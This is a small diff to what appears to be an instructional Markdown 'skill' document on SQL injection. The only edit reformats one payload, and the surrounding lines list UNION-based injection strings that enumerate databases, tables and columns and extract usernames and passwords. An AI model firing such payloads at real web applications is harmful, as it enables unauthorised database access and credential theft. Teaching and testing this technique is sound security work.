@@ -33,7 +33,7 @@ SQL injection is a common and dangerous Web application vulnerability. This skil
 - Database name: `' UNION SELECT database()--`
 - Table name: `' UNION SELECT table_name FROM information_schema.tables--`
 - List: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
-- Data extraction: `' UNION SELECT username, password FROM users--`
+- Data extraction: `' UNION SELECT username,password FROM users--`
 
 ## Using the Tools
 
